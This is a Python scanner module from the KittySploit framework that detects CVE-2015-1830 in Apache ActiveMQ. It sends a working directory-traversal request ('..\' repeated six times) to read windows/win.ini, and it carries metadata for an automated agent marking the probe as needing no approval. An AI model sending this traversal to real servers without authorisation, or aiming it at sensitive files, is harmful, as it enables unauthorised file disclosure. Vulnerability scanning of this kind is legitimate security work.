#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache ActiveMQ fileserver Windows path traversal (CVE-2015-1830)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ActiveMQ - fileserver Path Traversal Detection (CVE-2015-1830)',
        'description': (
            'Detects CVE-2015-1830 by requesting /fileserver/..\\..\\..\\windows/win.ini '
            'style paths on ActiveMQ fileserver.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'activemq', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-1830',
        ],
        'cve': 'CVE-2015-1830',
    }

    def run(self):
        path = '/fileserver/' + ('..\\' * 6) + 'windows/win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        body = r.text or ''
        if '; for 16-bit app support' in body or '[fonts]' in body.lower() or '[extensions]' in body.lower():
            self.set_info(
                severity='high',
                reason='ActiveMQ fileserver traversal (CVE-2015-1830)',
                path='/fileserver/',
            )
            return True
        return False
